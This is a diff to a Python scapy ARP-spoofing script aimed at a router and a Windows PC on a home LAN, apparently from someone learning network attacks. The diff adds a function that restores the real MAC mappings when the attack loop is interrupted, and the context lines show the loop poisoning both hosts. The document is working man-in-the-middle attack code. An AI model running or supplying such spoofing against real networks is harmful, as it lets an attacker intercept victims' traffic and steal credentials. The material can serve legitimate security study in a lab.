@@ -2,6 +2,15 @@
 
 import scapy.all as scapy
 
+def restore_defaults(dest, source):
+    # getting the real MACs
+    target_mac = get_mac(dest) # 1st (router), then (windows)
+    source_mac = get_mac(source)
+    # creating the packet
+    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
+    # sending the packet
+    scapy.send(packet, verbose=False)
+
 def get_mac(ip):
     # request that contain the IP destination of the target
     request = scapy.ARP(pdst=ip)
@@ -30,8 +39,10 @@ def main():
             spoofing("192.168.1.1", "192.168.1.130") # router (source, dest -> attacker machine)
             spoofing("192.168.1.130", "192.168.1.1") # win PC
     except KeyboardInterrupt:
-        print("[!] Process stopped")
-        exit()
+        print("[!] Process stopped. Restoring defaults .. please hold")
+        restore_defaults("192.168.1.1", "192.168.1.130") # router (source, dest -> attacker machine)
+        restore_defaults("192.168.1.130", "192.168.1.1") # win PC
+        exit(0)
 
 if __name__ == "__main__":
     main()
